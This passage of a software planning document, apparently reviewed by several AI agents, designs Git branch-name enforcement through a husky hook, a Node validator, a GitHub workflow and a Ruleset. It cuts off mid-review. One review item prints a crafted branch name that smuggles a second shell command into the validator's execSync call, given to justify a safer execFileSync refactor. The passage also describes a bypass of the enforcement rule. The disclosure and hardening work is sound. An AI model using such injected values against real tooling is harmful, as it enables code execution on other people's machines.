13. **Smoke test** with a throwaway non-compliant branch as described in "Verification after creation".

Steps 1-9 can all be bundled in the same commit set since they reference each other. Steps 10-12 are owner ceremony.

---

## Non-goals (do not touch)

- **Do not rewrite existing branch names.** The grandfather rule handles them.
- **Do not change the owner's local merge-to-main workflow.** The Ruleset bypass preserves it.
- **Do not add commit-message enforcement.** Out of scope; only branch names.
- **Do not introduce heavy deps.** husky is ~1.4 kB; the Node script has zero external deps.
- **Do not require `gh auth login` for devs.** The pre-push hook never calls `gh`.
- **Do not add a `postinstall` script.** Husky v9 uses `prepare`, which is strictly safer (only runs in dev installs, skipped by `--production` / consumers).

---

## Risks and edge cases

### 1. Husky prepare script fails on CI because no `.git` is present
**Risk**: Some CI environments run `npm install` in a directory without a `.git` folder (e.g. release workflows that check out with `fetch-depth: 1` and then install deps). Husky v9 exits silently in that case (by design), so this is NOT a failure. Confirmed in husky docs.
**Mitigation**: None needed. The release workflow (`.github/workflows/release.yml:77 — npm install`) will print a harmless "husky - not a git repository" warning on CI servers that don't have `.git`. Actually `actions/checkout@v4` DOES check out `.git`, so this is fine.

### 2. Dev without Node installed
**Risk**: Dev runs `git push` before ever running `npm install`. The hook fails with "node: command not found".
**Mitigation**: README / CONTRIBUTING already tells devs to run `npm install` first. If they don't, the hook error tells them to install Node. Acceptable friction — they can't build the project without Node anyway.

### 3. Pushes during the transition window
**Risk**: Before the Ruleset is applied, the workflow is already running and may block devs with invalid branch names even though the Ruleset isn't active yet (because the check is failing, but nothing requires it).
**Mitigation**: The check failure is informational until the Ruleset is applied. Devs see a red ❌ on GitHub but can still merge (if the no-PR direct-merge flow is still active during transition). Recommend the owner apply the Ruleset in the same session that this PR merges, to avoid confusion.

### 4. Issue closed while branch is in flight
**Risk**: Dev opens issue #100, creates branch `feature/100-foo`, the issue is closed before the PR is merged. The Action reruns on subsequent pushes and fails.
**Mitigation**: Intentional. If the issue is closed, the scope of the work is gone. Dev should reopen the issue or retarget to an open one. This is captured in CONTRIBUTING.

### 5. Rate limiting the GitHub API
**Risk**: `api.github.com/repos/:owner/:repo/issues/:n` is rate-limited at 5000 req/h per token. The workflow uses `github.token` (a job-scoped token with the same quota). Not a practical concern for this repo's push volume.
**Mitigation**: None needed.

### 6. Slug length cap vs. real-world usage
**Risk**: 50 chars may be too tight for very descriptive slugs.
**Mitigation**: The regex rejects long slugs explicitly with a clear error. 50 chars fits ~8-10 words. If that proves too tight in practice, bump `MAX_SLUG` in one place. Spec required a reasonable cap; 50 is a defensible number.

### 7. Force-push rewriting history under the grandfather cutoff
**Risk**: Dev force-pushes a branch rebased past the cutoff. Validation switches from skipped to active.
**Mitigation**: Intentional. Rebased branches are effectively new; they should comply.

### 8. First push of the enforcement branch itself
**Risk**: When the feature branch `feature/63-branch-name-enforcement` is first pushed, the workflow file is being introduced by that same branch. The merge-base with `main` is the commit BEFORE the workflow was added. The grandfather check would match → skip validation. So the branch would be grandfathered on its first push.
**Mitigation**: This is a one-time self-reference case. The branch name IS valid, so validation would pass anyway. For completeness: the server-side check on first push reports "grandfathered" with exit 0 — harmless and correct. Future branches (after this merges to main) see the workflow file at the merge-base → fully enforced.

### 9. Owner bypass and CI skew
**Risk**: Owner pushes directly to `main` (bypassing the Ruleset's PR requirement). The workflow doesn't run on `main` (it's in `branches-ignore`). No check is ever published for these commits.
**Mitigation**: Intentional. The owner's local-merge flow is explicitly preserved per spec. Only feature-branch pushes trigger the check.

### 10. Husky hook not installed because `.git` was moved
**Risk**: If the repo is moved or the `.git` dir is recreated (e.g., after `git clone`), husky must re-run `prepare`.
**Mitigation**: `prepare` runs on every `npm install` / `npm ci`. Devs routinely run one or the other.

### 11. Branch-deletion push events publishing red checks (round-2 G4)
**Risk**: `on: push` fires for branch deletions (after-SHA is all zeros). `actions/checkout@v4` cannot check out a deleted ref → the run fails red → open PRs pointing at that commit see their required check flip green → red.
**Mitigation**: Workflow job has `if: github.event.deleted != true && github.event.after != '0000000000000000000000000000000000000000'` guard → the job is skipped on deletion events, no red check is published.

### 12. Stale green check after issue is closed post-merge-ready (round-2 G12)
**Risk**: A branch reaches a green `validate-branch-name` check; the referenced issue is then closed without any further push; the check stays green and the Ruleset lets the PR merge even though the plan's stated guarantee is "must reference an OPEN issue."
**Mitigation**: Accepted as a known narrow-race gap. The locked decisions do not require PR-event triggers, and adding `pull_request: { types: [...] }` expands the attack surface (fork PRs). Devs closing an issue after a green check is expected to manually cancel or re-push the PR. If this race materialises in practice, add a `pull_request` trigger in a follow-up.

### 13. Windows contributors without Git Bash silently skip the local hook (round-2 G8)
**Risk**: On Windows, husky v9 invokes `.husky/pre-push` via `sh`. Clients without Git for Windows (some GUI tools, GitHub Desktop's bundled git) have no `sh` on PATH → the hook silently no-ops → dev only sees rejections server-side.
**Mitigation**: Documented in `CONTRIBUTING.md` under "Windows tooling note" — Git for Windows required. Not rewriting the hook in Node-only form; the owner already uses Git Bash and the server-side check is authoritative.

### 14. Fork-triggered workflow runs (round-2 G7)
**Risk**: A fork of this repo pushes to its own branches; the fork's runner executes `validate-branch-name.mjs`; the hardcoded `TARGET_REPO` makes the issue lookup hit upstream's issue namespace. A fork's token may lack access to upstream → 404 → check fails.
**Mitigation**: Intentional. The hardcoded target repo guarantees that upstream PR merges are never satisfied by a fork's unrelated issue number. Fork-originated PRs are a non-goal (spec section "Non-goals"); document as accepted behavior.

### 15. Fail-CLOSED on transient git errors in `isGrandfathered` (round-2 G2)
**Risk**: A transient git error (missing object, shallow clone, IO hiccup) on the server or a local machine now enforces validation where the old scheme would have skipped.
**Mitigation**: By design. Better to over-enforce (loud, fixable: `git fetch`, `git pull`, `--no-verify`) than silently no-op (invisible, catastrophic). If a legitimate branch flips from grandfathered to enforced after fetch, that is the correct behavior — the cutoff is now in its ancestry.

---

## Verification

After merge, run these checks:

1. **Local hook fires on push**:
   ```bash
   git checkout -b "test/invalid"
   git commit --allow-empty -m "probe"
   git push origin test/invalid   # → pre-push hook rejects before network call
   ```

2. **Grandfather skips old branches**:
   ```bash
   # On a branch cut from a commit older than the workflow's landing commit:
   node scripts/validate-branch-name.mjs --branch foo/bar
   # → [branch-name] grandfathered (cut before enforcement): foo/bar
   ```

3. **Exempt branches pass**:
   ```bash
   node scripts/validate-branch-name.mjs --branch main
   node scripts/validate-branch-name.mjs --branch dependabot/npm/husky-9.2.0
   node scripts/validate-branch-name.mjs --branch release/1.0
   # → all exempt
   ```

4. **Valid branch passes end-to-end**:
   ```bash
   node scripts/validate-branch-name.mjs --branch feature/63-branch-name-enforcement
   # → [branch-name] OK: feature/63-branch-name-enforcement
   ```

5. **Invalid format fails with a clear message**:
   ```bash
   node scripts/validate-branch-name.mjs --branch feat/63-foo
   # → error naming the convention and an example
   ```

6. **GitHub Action publishes the status check**:
   - Push the feature branch.
   - In the GitHub Actions tab, verify a workflow run named "Validate branch name" exists for the commit.
   - In the commit view, verify a status check labeled `validate-branch-name` with a green ✔.

7. **Ruleset blocks an invalid PR** (post-ruleset-apply):
   - As a non-owner (or via a fork), push `test/nope-not-valid`.
   - Open a PR to `main`.
   - Merge button should be disabled citing the missing required check.

8. **Ruleset allows owner direct push**:
   - Owner pushes to `main` with a local merge commit — allowed by Bypass list.

---

## Files Summary

| File | Action | Lines (approx) |
|---|---|---|
| `scripts/validate-branch-name.mjs` | **NEW** | ~140 |
| `.husky/pre-push` | **NEW** | ~15 |
| `.github/workflows/validate-branch-name.yml` | **NEW** | ~35 |
| `.github/branch-name-enforcement.cutoff.sha` | **NEW** | 1 |
| `.gitattributes` | **NEW** | 2 |
| `CONTRIBUTING.md` | **NEW** | ~85 |
| `package.json` | Modified | +3 lines |
| `.gitignore` | Modified | +1 line |

**Total: ~280 new lines across 8 files (6 new, 2 modified).** Plus one owner-ceremony commit on `main` that rewrites the cutoff SHA file from `PENDING` to the real 40-char SHA.

---

## Implementer enrichments (dev-rust review)

Reviewed plan against current repo state (branch `feature/63-branch-name-enforcement`, clean tree minus this file + unrelated `_plans/fix-wake-mode-exited-sessions.md`). Factual spot-checks: `package.json` matches lines 6-13 and 23-29 exactly; `.gitignore` contents match; `.github/workflows/release.yml` exists and line 77 is `npm install` (Risk 1 claim verified); no `.husky/`, no `CONTRIBUTING.md`, no `.gitattributes`; `package-lock.json` exists.

Adding the following items. Each has a reasoning line so architect/grinch can accept or reject individually.

---

### E1. **REQUIRED** — add `.gitattributes` to pin LF line endings on `.husky/pre-push`

**What**: create new file `.gitattributes` (repo root) with at minimum:
```
.husky/** text eol=lf
*.sh text eol=lf
```

**Why**: primary dev machine is Windows (this project's CLAUDE.md documents ConPTY / Windows paths). Git's `core.autocrlf=true` default on Windows rewrites committed files to CRLF on checkout. A shell hook committed with CRLF fails at runtime with errors like `/usr/bin/env: 'node\r': No such file or directory` or `bad interpreter`. husky v9 provides no shebang workaround — it just executes the hook file under `sh`. Pinning `eol=lf` at the attribute level forces LF on checkout regardless of the dev's `autocrlf` setting. This is a **silent foot-gun**; without this file the first dev on Windows (likely the owner) may see the hook break immediately after `npm install`.

**Update `## Files to create` table**: add row for `.gitattributes`.
**Update `## Files Summary` table**: add row for `.gitattributes` (~2 lines).

---

### E2. **REQUIRED** — set executable bit on `.husky/pre-push` before committing

**What**: after writing the hook file, run:
```bash
git update-index --add --chmod=+x .husky/pre-push
```
Add this as an explicit step after step 5 in `## Implementation order`.

**Why**: `Write`/editor tools on Windows do not set the Unix executable bit. Git tracks the mode in the tree object; once committed with `100755`, every subsequent checkout on macOS/Linux has execute permission. If committed as `100644`, husky's wrapper still invokes it via `sh <file>` so it might work on some setups — but this depends on husky internals and is fragile. `git update-index --chmod=+x` is the portable one-shot fix and costs nothing. Verify with `git ls-files --stage .husky/pre-push` showing `100755`.

---

### E3. **RECOMMENDED** — document / commit the `package-lock.json` update

**What**: add a line to `## Implementation order` step 4 (`npm install`): *"commit the resulting `package-lock.json` change alongside `package.json`"*.

**Why**: adding `husky` devDep mutates `package-lock.json`. If that file is not committed, every `npm ci` on CI or a new clone fails or installs a different tree. The release workflow (`.github/workflows/release.yml:77`) uses `npm install` which regenerates the lockfile on the fly, so release won't break — but any future introduction of `npm ci` will. Cheap to flag now.

---

### E4. **RECOMMENDED** — clarify pre-push hook guard against malformed stdin

**What**: consider adding an explicit check at the top of `.husky/pre-push` to skip when stdin is empty or git provides no refs (e.g. `git push` with nothing to push would normally not invoke the hook, but safer to be defensive):
```sh
# (optional defensive early-exit — remove if you prefer strict behavior)
if [ ! -t 0 ] && ! read -r first_line; then
  exit 0
fi
# then continue the while-read loop starting from $first_line parsed
```
**If you don't want this**, the current version is fine — git guarantees it only invokes `pre-push` when there's something to push.

**Why**: minor robustness. The plan's current loop calls `exit 0` after the loop ends, which already handles the zero-ref case correctly. So this enrichment is **optional** — leave the plan as-is unless architect wants the extra guard. Flagging for transparency.

---

### E5. **REQUIRED** — spell out the exact Ruleset check context string

**What**: the Ruleset "Add checks" input expects the check name **as it appears on a completed run**. With the current workflow (`name: Validate branch name`, `jobs.validate-branch-name.name: validate-branch-name`), the check context published on a commit is the **job's** `name` field: `validate-branch-name`. Plan already says this in two places — good. Add a one-line verification step to the Ruleset recipe: after first run, visit the commit page and copy the exact string from the check list into the Ruleset input (case-sensitive, no leading/trailing spaces).

**Why**: Rulesets silently fail to match check names that differ by case or whitespace. Copy-paste from a real check run eliminates the risk. One sentence added to section `## Ruleset configuration recipe` step 7 row `↳ Add checks`.

---

### E6. **RECOMMENDED** — small robustness tweaks in `validate-branch-name.mjs`

All minor, zero behavior change for the happy path. Accept/reject individually:

**(a)** In `shOk`, current swallow-errors branch may mask real breakage. Fine for `git rev-parse --verify origin/main` and `git cat-file -e ...`. Leave as-is.

**(b)** In `resolveRepoFromRemote`, the regex `github\.com[:/]([^/]+)\/([^/.]+?)(?:\.git)?$` fails on SSH URLs with a user prefix like `git@github.com:mblua/AgentsCommander.git`. The regex DOES handle this (the `[:/]` covers the colon and slash forms). Re-tested mentally. Fine.

**(c)** `isGrandfathered` uses `origin/main` hardcoded. If a fork has a different default branch name (e.g., `master`) the grandfather check always returns `false` and the workflow proceeds to format check — correct fallback, but on a fork with no `origin/main` the helpful path is wrong. Acceptable since this repo's default branch is `main` and only contributors with write access run the hook locally. **Flag for completeness; no change.**

**(d)** `verifyIssueOpen` dies on `res.status === 404`. GitHub returns 404 for: (i) issue doesn't exist, (ii) issue exists but token has no access (private repo). Message "Issue #N does not exist" can confuse when auth is actually the problem. Suggest rewording: `` `Issue #${issue} not accessible in ${repo} (missing or auth-denied).` ``. Safer failure copy.

**(e)** `verifyIssueOpen` does not timeout. `fetch` in Node 20 has no default timeout. On a hung GitHub API call the workflow waits until the runner's 6h cap. Suggest adding `AbortSignal.timeout(10_000)`:
```js
const res = await fetch(url, { signal: AbortSignal.timeout(10_000), headers: { ... } });
```
and catch the abort error with a clean `die('Timed out fetching issue #...')`. Cheap, prevents rare runner-hang waste.

**Why (overall)**: these are 3-5 line diffs that harden the validator's error paths. Plan is fine without them but they make future debugging faster.

---

### E7. **INFO ONLY** — self-push behavior of the enforcement branch

Confirmed plan Risk 8 is correct: pushing `feature/63-branch-name-enforcement` BEFORE the merge triggers the grandfather skip (merge-base with `main` is `39f8b7e`, which pre-dates the workflow file). Both client hook and server workflow exit 0 without format/issue checks. After merge, new branches have merge-base containing the workflow file and are enforced. No action needed. Mentioning so it's not re-investigated later.

---

### E8. **INFO ONLY** — grandfather check on a fresh clone without `origin/main` ref

Plan already documents (Risk section on grandfather edge case). Confirmed: `actions/checkout@v4` with `fetch-depth: 0` creates the remote-tracking `refs/remotes/origin/main` on the runner, so `git rev-parse --verify origin/main` succeeds and the explicit `git fetch origin main` step in the workflow is **redundant but harmless**. Keep it — small cost, avoids any future regression if checkout action behavior changes.

---

### Round 2 addendum

Re-reviewed the round-2 rewrite against the repo state (branch still `feature/63-branch-name-enforcement`, HEAD `39f8b7e`, files listed in Files Summary still absent). Validator code at lines 119-267 read end-to-end; workflow at 316-359 cross-checked; Implementation order 1-13 walked through step-by-step; CONTRIBUTING.md note at line 483 confirmed.

**High-level: the round-2 fixes land correctly.** G1+G2+G3 close the primary bypass as described. G4/G5/G6/G7 are minimal, targeted YAML/JS deltas that do what they say. `.gitattributes` (E1) and exec-bit ceremony (E2) are both in Implementation order. No regressions visible vs. round 1.

**Two new concerns worth flagging** — neither is a blocker. Round-2 did not introduce them; they have been present since round 1 but are surfaced more sharply by the G2 fail-CLOSED discipline (which makes the remaining attack surface more visible).

---

#### R2-1. **MEDIUM (hygiene, not security-critical given trust model)** — `execSync` + shell + branch interpolation in `isGrandfathered`

**Where**: `scripts/validate-branch-name.mjs` lines 199-200:
```js
if (!shOk(`git rev-parse --verify "${branch}"`)) return false;
if (shOk(`git merge-base --is-ancestor ${cutoff} "${branch}"`)) return false;
```
`sh`/`shOk` (lines 162-168) call `execSync(cmd, …)` with **no `shell:false`**, so Node spawns `/bin/sh -c <cmd>` (Linux) or `cmd.exe /s /c <cmd>` (Windows). The branch name is JS-interpolated into the command string — a double-quoted arg, so typical names are safe, but `git check-ref-format` permits characters including `"`, `$`, `` ` ``, `\`, `(`, `)`, `{`, `}`. A branch named literally:
```
feature/99-x"; echo PWNED > /tmp/x; echo "
```
is a valid git ref. On reaching `isGrandfathered` its interpolation becomes:
```
git rev-parse --verify "feature/99-x"; echo PWNED > /tmp/x; echo ""
```
That is two shell statements. Code execution in whatever shell runs the validator.

**Important: ordering makes it reachable before format validation.** Control flow at lines 254-258 runs `isExempt → isGrandfathered → validateFormat`. Malicious names (which would fail `validateFormat`'s strict regex) reach `isGrandfathered`'s shell before any character allowlist. Re-ordering is not an option — grandfathered old branches legitimately have non-compliant names, and validateFormat must run **after** the grandfather short-circuit.

**Real-world impact, given the trust model**:
- **Upstream attacker**: needs push access to upstream. But a contributor with push access already has strictly-greater capabilities (can submit a malicious workflow directly, push a `.github/workflows/evil.yml`). Injection here is equivalent to "can push a workflow" — not a net-new capability.
- **Fork attacker**: fork-originated workflow runs execute inside the fork's own runner. Injection only harms the fork's own ephemeral token. No cross-repo blast.
- **Client-side hook**: runs in the dev's own shell. Self-harm only.

Net: not a security boundary in the current trust model. But it is a **cheap hygiene fix** and future collaborators may invalidate the "push access == workflow access" assumption (e.g., if you ever enable branch-protection on `.github/workflows/**` or adopt CODEOWNERS-gated workflow edits).

**Suggested fix** (one-diff, no behavior change): switch the validator's helpers from `execSync(cmdString)` to `execFileSync('git', argArray)`. No shell, no interpolation, no injection:
```js
import { execFileSync } from 'node:child_process';

function git(args) {
  return execFileSync('git', args, { encoding: 'utf8', stdio: ['ignore','pipe','ignore'] }).trim();
}
function gitOk(args) {
  try { execFileSync('git', args, { stdio: 'ignore' }); return true; } catch { return false; }
}
```
Callers become (examples):
```js
git(['show', `origin/main:${CUTOFF_SHA_PATH}`])                      // readCutoffSha
gitOk(['rev-parse', '--verify', `${cutoff}^{commit}`])               // cutoff present?
gitOk(['rev-parse', '--verify', branch])                              // branch resolvable?
gitOk(['merge-base', '--is-ancestor', cutoff, branch])                // ancestor check
git(['symbolic-ref', '--short', 'HEAD'])                              // resolveBranch
```
~5-line refactor. Removes the class of bug entirely.

**If you don't want to refactor now**, the minimum band-aid is a character allowlist gate right after `isExempt` and **before** `isGrandfathered`:
```js
if (!/^[A-Za-z0-9_./-]+$/.test(branch)) {
  die(`Branch "${branch}" contains characters that cannot be safely validated. Rename it.`);
}
```
This preserves the current grandfather semantics (names that are git-refs-but-odd fail early; legitimate old branches with standard chars still pass through to grandfather check).

**Recommendation**: prefer `execFileSync` migration — the band-aid works but the refactor is cleaner and future-proof. Either path is acceptable; architect's call.

---

#### R2-2. **LOW** — shrink the `PENDING` window between steps 10 and 11

**Where**: Implementation order steps 10-11 (lines 691-706). Current flow:
- Step 10: owner merges feature branch locally into `main`, pushes `main` (workflow + validator + cutoff-SHA file with content `PENDING` now land on `origin/main`).
- Step 11: owner separately records the real SHA into the cutoff file and pushes a follow-up commit.

**Between the two `git push origin main` invocations** the remote `origin/main` carries `PENDING` as the cutoff-SHA-file contents. `readCutoffSha()` returns `null` → `isGrandfathered` returns `false` → **every branch is enforced**, including genuinely-grandfathered old branches. Any push to a non-compliant-but-grandfathered branch during this window fails the server-side check.

**Why LOW**: solo-dev repo, the window is minutes at most (owner runs steps 10-11 back-to-back). Currently no other contributor is pushing. Not a functional bug — it's a transient over-enforcement.

**Suggested tightening** (optional): collapse steps 10 and 11 into a single owner ceremony — do not push `main` until after the cutoff SHA has been written and committed on top of the merge commit. Push both commits in one `git push origin main`. Window is then zero.

Concrete script:
```bash
git checkout main
git fetch origin && git merge --no-ff origin/main   # ensure up-to-date
git merge --no-ff feature/63-branch-name-enforcement -m "Merge branch 'feature/63-branch-name-enforcement'"
MERGE_SHA=$(git rev-parse HEAD)
echo "$MERGE_SHA" > .github/branch-name-enforcement.cutoff.sha
git add .github/branch-name-enforcement.cutoff.sha
git commit -m "chore(ci): record branch-name enforcement cutoff SHA"
git push origin main        # merge + SHA commit pushed atomically
```
Drop-in replacement for current steps 10-11. No new files, no new ceremony, shrinks the window to zero.

Accept/reject at architect's discretion. If rejected, current steps 10-11 still work — it just means a few minutes of transient over-enforcement on old branches.

---

#### R2-3. **INFO ONLY** — confirmed HIGH/MED fixes work at the implementation level

Spot-checked each fix from the disposition table against the actual code/YAML:

| Fix | Where | Implementer-level verification |
|---|---|---|
| G1 pinned-SHA | validator lines 183-202, cutoff file section 4 | `git show origin/main:<path>` reads from remote-tracking branch (not working tree) — correct for feature-branch pre-push where the file is only on main. `^[0-9a-f]{40}$` rejects `PENDING`. `--is-ancestor` returns 0 if ancestor; caller negates. All edges documented. ✓ |
| G2 fail-CLOSED | validator lines 195-202 | Four explicit `return false` branches; no `shOk` result silently returns true. ✓ |
| G3 mandatory up-to-date | Ruleset recipe line 656 + CONTRIBUTING line 483 | Bold + "Do not disable" note in Ruleset; "Maintainer note" in CONTRIBUTING repeats the warning with G1 rationale. ✓ |
| G4 deletion guard | workflow line 341 | Double guard (`deleted != true` AND `after != '000…0'`) handles both payload shapes. ✓ |
| G5 concurrency | workflow lines 333-335 | `cancel-in-progress: true` grouped by `${{ github.ref }}`. ✓ |
| G6/E6(e) timeout | validator lines 221-247 | `AbortSignal.timeout(10_000)` with explicit `TimeoutError`/`AbortError` branch. Non-abort errors take a distinct `die()` path. ✓ |
| G7 hardcoded upstream | validator line 136 + line 224 | `TARGET_REPO` constant, `resolveRepoFromRemote` fully removed. ✓ |
| G8 Windows note | CONTRIBUTING line 468-472 | Explicit Git-for-Windows requirement; `sh --version` verification command. ✓ |
| E1 `.gitattributes` | new section 5 + Implementation step 2 | Created BEFORE hook in step order — prevents the CRLF foot-gun at checkout. ✓ |
| E2 exec bit | Implementation step 6 | `git update-index --add --chmod=+x` + `git ls-files --stage` verification. ✓ |
| G11 try/catch | validator lines 250-266 | IIFE wraps `main()` — every uncaught rejection funnels through `die()`. Prefix preserved. ✓ |

All other items (G9 moot, G10/E8 deleted step, G12/G13 documented/moot, G14 deferred) track cleanly.

---

**Verdict from dev-rust**: **APPROVED WITH MINOR NOTES.**

Plan is implementable as-is. I will carry **R2-1 (execFileSync migration)** into the implementation whether or not you pick that up formally — it is a 5-line refactor that makes the validator strictly safer at no cost. **R2-2 (steps 10-11 collapse)** is a nice-to-have ceremony tweak; implement or not per architect preference. **R2-3** is confirmation, no change.

No blocking issues, no rulings needed from tech-lead, no round-3 escalation on my side.

---

## Grinch review

Adversarial pass. Read plan + enrichments against current repo (HEAD `39f8b7e`, branch `feature/63-branch-name-enforcement`, no `.husky/`, no `CONTRIBUTING.md`, `package.json` matches cited lines). Below, bugs/gaps ordered by severity. For each: **What / Why / Fix**.

### G1. **HIGH** — Grandfather bypass by branching off a pre-cutoff commit

**What.** `isGrandfathered(branch)` computes `git merge-base origin/main <branch>` and checks whether `WORKFLOW_PATH` exists at that merge-base. Any contributor with write access can bypass enforcement forever by doing:
```bash
git checkout 39f8b7e            # any commit predating the enforcement merge
git checkout -b garbage/bad_name
git commit -m "..." --allow-empty
git push -u origin garbage/bad_name
```
The merge-base of `garbage/bad_name` with `origin/main` is `39f8b7e`, which does not contain the workflow file → validator reports `grandfathered` → **exit 0** → status check is **green** → Ruleset merge gate satisfied. The branch can land on `main` with an invalid name and no issue link.

**Why it matters.** Entire point of the plan is to forbid non-compliant names on new work. Plan's Risk 7 only contemplates *rebase forward* unlocking enforcement; it does NOT address the trivial *base backward* bypass. "Contributor has write access, why would they do this" is not a defence — the whole system is a voluntary hygiene gate and the grandfather rule makes it bypassable by a one-liner.

**Fix.** Switch grandfather semantics from *"workflow file absent at merge-base"* to *"a pinned cutoff commit is NOT an ancestor of the branch tip"*. Concretely:
1. After this plan's merge to `main`, record the enforcement merge commit SHA in a file committed to `main` (e.g. `scripts/branch-name-enforcement.cutoff` containing the SHA), or as a git tag `branch-name-enforcement-cutoff`.
2. `isGrandfathered(branch)` becomes: `return !shOk('git merge-base --is-ancestor <CUTOFF_SHA> ' + branch);` — i.e. if the cutoff is an ancestor of the branch, enforce; otherwise grandfather.
3. Any branch created after the cutoff is merged MUST have the cutoff commit in its history (because its base must be a commit ≥ cutoff), so enforcement fires. Pre-cutoff branches that have never been rebased still skip. Attack above fails: `garbage/bad_name` cut from `39f8b7e` does NOT have the cutoff as ancestor → currently grandfather returns true. BUT the Ruleset step "Require branches to be up to date before merging" (see G3) forces a rebase onto current `main` before merge, which then puts the cutoff in the ancestry → enforcement fires before the merge button activates.

Combining the pinned cutoff with the mandatory up-to-date rule closes the hole.

---

### G2. **HIGH** — `shOk` swallows all errors in `isGrandfathered`, failing OPEN

**What.** In `scripts/validate-branch-name.mjs` line 186:
```js
return !shOk(`git cat-file -e ${mb}:${WORKFLOW_PATH}`);
```
`shOk` returns `false` on **any** `execSync` failure: file absent (intended), tree object missing from a shallow/partial clone (not intended), corrupt pack, git binary error, PATH issue, permission issue on `.git/objects`, merge-base SHA unknown locally, etc. Every one of those paths makes `isGrandfathered` return `true` → validation silently skipped.

**Why it matters.** Client side this is noisy but tolerable (server still catches). Server side, however, if the `fetch-depth: 0` checkout ever regresses (e.g. future tweak to the workflow, future checkout action change, runner cache weirdness), the validator converts into a silent no-op and ships a green check for *every* branch. No alarm. Regression would be invisible until someone notices a bad branch name landing months later.

**Fix.**
- Tighten `isGrandfathered` to distinguish "file definitely absent" from "can't tell":
  ```js
  // Confirm merge-base object is usable first
  if (!shOk(`git rev-parse --verify ${mb}^{commit}`)) return false; // fail closed → enforce
  // Now test for file presence at that tree
  if (!shOk(`git cat-file -e ${mb}:${WORKFLOW_PATH}`)) return true;  // genuinely absent → grandfather
  return false;
  ```
  Pairs with G1's cutoff SHA: if using `git merge-base --is-ancestor <CUTOFF>`, errors in that command should also fail **closed** (enforce), not open.
- Add a workflow post-step assertion: if `isGrandfathered` returned true AND the branch name would have failed format, log a warning. Cheap sanity telemetry.

---

### G3. **HIGH** — "Require branches to be up to date before merging" is marked Recommended, not Required

**What.** In `## Ruleset configuration recipe` step 7, the row `↳ Require branches to be up to date before merging` is labelled `ON` with `"Recommended; avoids stale-merge surprises"`. The word "Recommended" reads as optional.

**Why it matters.** This rule is the load-bearing mitigation for the grandfather bypass (see G1). Without it, a branch cut from a pre-cutoff commit with a bad name can merge via PR without ever being rebased forward, so the cutoff commit never enters its ancestry → grandfather stays true → bad name lands on `main`. Calling it "recommended" invites the owner to disable it thinking it's ergonomic fluff.

**Fix.** Promote the row to MANDATORY phrasing. Change the Notes column to: `**Required — closes the grandfather bypass by forcing branches to reach a post-enforcement merge-base before merge.**` and elevate the row header to bold to match the other mandatory toggles. Mention G1 explicitly in CONTRIBUTING so future maintainers don't disable it.

---

### G4. **MEDIUM** — Workflow fires on branch-deletion push events, will always fail

**What.** `on: push: branches-ignore: [...]` does NOT distinguish push-create/push-update from push-delete. When a contributor deletes a non-exempt branch (`git push origin --delete feature/63-x`), GitHub fires a push event with `ref` = deleted branch and `before` = last SHA / `after` = `0000...0000`. `actions/checkout@v4` attempts to check out the now-deleted ref and fails. The run ends red. If that commit already had a green `validate-branch-name` check, it now has a red one too; Ruleset-gated PRs that point at it may become non-mergeable.

**Why it matters.** Every branch-cleanup `git push origin --delete` spams a red check. Worst case, a still-open PR targeting `main` whose source branch was renamed (branch rename = delete + recreate at GitHub level) transitions from green → red on the original SHA and blocks merge. Medium-severity UX problem and a real merge-blocker on rename flow.

**Fix.** Guard the job with an `if:` condition skipping deletions:
```yaml
jobs:
  validate-branch-name:
    if: github.event.deleted != true
    ...
```
or filter at the trigger level with `delete` not included (already the case — but `push` with zero-SHA after is still a push). The `if:` guard is the cleanest.

---

### G5. **MEDIUM** — No `concurrency` group → wasted runner minutes, racy pending states

**What.** Workflow has no `concurrency:` key. Rapid force-pushes (a dev iterating on a branch) spawn parallel runs. GitHub does NOT auto-cancel older runs.

**Why it matters.** Each run takes ~30-60s. A dev doing five quick force-pushes burns 5× that in CI minutes, and for a window of time PRs show mixed pending/green/red states confusing the Ruleset gate. Also wastes GH Actions quota.

**Fix.** Add to the workflow top level:
```yaml
concurrency:
  group: validate-branch-name-${{ github.ref }}
  cancel-in-progress: true
```
2-line change, meaningful savings.

---

### G6. **MEDIUM** — `verifyIssueOpen` has no request timeout

**What.** `fetch(url, { headers })` in Node 20 has no default timeout. A hung GitHub API endpoint stalls the workflow until the runner's 6h cap.

**Why it matters.** Unlikely daily but real: GitHub API had multi-hour partial outages in 2024 and 2025. During one of those, this gate sits at "pending" for hours, blocking all PR merges. Dev-rust already flagged this in E6(e) as a suggestion; Grinch upgrades to MEDIUM and marks as **REQUIRED**.

**Fix.** Apply E6(e) verbatim:
```js
const res = await fetch(url, {
  signal: AbortSignal.timeout(10_000),
  headers: { ...},
});
```
Catch `AbortError` and call `die('Timed out fetching issue #' + issue + ' from GitHub API.')`.

---

### G7. **MEDIUM** — Fork-originated `push` events hit the fork's issues, not upstream's

**What.** When any push event fires in a fork (automated bot forks, human contributor fork doing CI-before-PR, GitHub Actions demo forks), `GITHUB_REPOSITORY` is the fork. Validator calls `https://api.github.com/repos/<fork>/issues/<n>` which is the fork's issue namespace — usually empty or mismatched with upstream.

**Why it matters.** Plan's Open Question 1 only addresses PRs from forks. Push-in-fork is separate and already breaks: the fork's workflow run dies on a false-positive "issue does not exist" even when the branch name correctly points at an upstream issue. If the fork happens to also have an unrelated issue #N, the check passes for the wrong reason.

**Fix.** Hardcode target repo for issue lookup rather than trusting `GITHUB_REPOSITORY`:
```js
const TARGET_REPO = 'mblua/AgentsCommander';
const repo = TARGET_REPO; // was: process.env.GITHUB_REPOSITORY || resolveRepoFromRemote();
```
Or require the env var to match and die with a clear message if it doesn't. Locked decision: single-owner repo, no external forks yet, so hardcoding is acceptable and sharper.

---

### G8. **MEDIUM** — Husky pre-push silently no-ops on Windows without Git Bash

**What.** `.husky/pre-push` is a POSIX shell script. Husky v9 invokes it via `sh`. On Windows, `sh` is only available if Git for Windows / Git Bash is installed. Devs using GitHub Desktop's bundled git, VS Code's built-in git (with `git` on PATH but not `sh`), Tower, SourceTree without the bash option, or Fork may have no `sh`. In those cases husky v9 either fails to execute or executes differently than expected.

**Why it matters.** The plan claims "fast local feedback" as the raison d'être of the husky layer. On common Windows setups, the hook may not run at all → developer gets NO feedback → discovers rejection only after push hits server. This contradicts the sales pitch and is undocumented.

**Fix.**
- Add a Windows-tooling note to `CONTRIBUTING.md` explicitly requiring Git for Windows (not GitHub Desktop's git) for the pre-push hook to fire.
- Alternatively, rewrite `.husky/pre-push` as pure Node (no shell) by replacing the shell loop with a Node wrapper that reads stdin directly:
  ```sh
  # .husky/pre-push (works anywhere sh or node exists)
  exec node scripts/hook-pre-push.mjs
